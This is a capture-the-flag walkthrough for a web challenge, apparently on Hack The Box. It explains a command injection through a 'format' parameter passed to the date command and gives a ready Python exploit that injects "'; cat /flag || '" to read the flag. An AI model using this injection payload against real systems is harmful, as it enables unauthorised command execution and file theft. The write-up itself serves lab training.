Challenge: KORP time <br>
Category: Web <br>
Difficulty: easy <br>
Vulnerability: Command injection (format parameter)
<br>
<h1>Description</h1> The application exposes an endpoint that accepts a “format” query parameter and passes it directly into a shell call to date, without any sanitization. By injecting a shell-breaking sequence into the format string, you can chain arbitrary commands. In this case, sending '; cat /flag || ' causes the server to dump the contents of /flag* into the HTTP response.

<ul> <li>Save the following Python script as <code>exploit.py</code>: <pre><code>import sys import requests import re

url = sys.argv[1] url_flag = f"http://{url}/"

params = { 'format': "'; cat /flag || '" }

r = requests.get(url_flag, params=params) flag = re.search(r"HTB\{.*?\}", r.text)

if flag: print(flag.group(0)) </code></pre> </li>

<li>Run the exploit against the target host: <pre><code>python3 exploit.py &lt;target_ip&gt;</code></pre> </li>

<li>The script sends a GET request to: <pre><code>http://&lt;target_ip&gt;/?format='; cat /flag || '</code></pre> </li>

<li>The application invokes <code>date</code> unsafely, allowing <code>cat /flag</code> to execute and embed the flag in the response body.</li>

<li>The script then applies a regex (<code>HTB\{.*?\}</code>) to extract the flag from the response and prints it to stdout.</li> </ul>
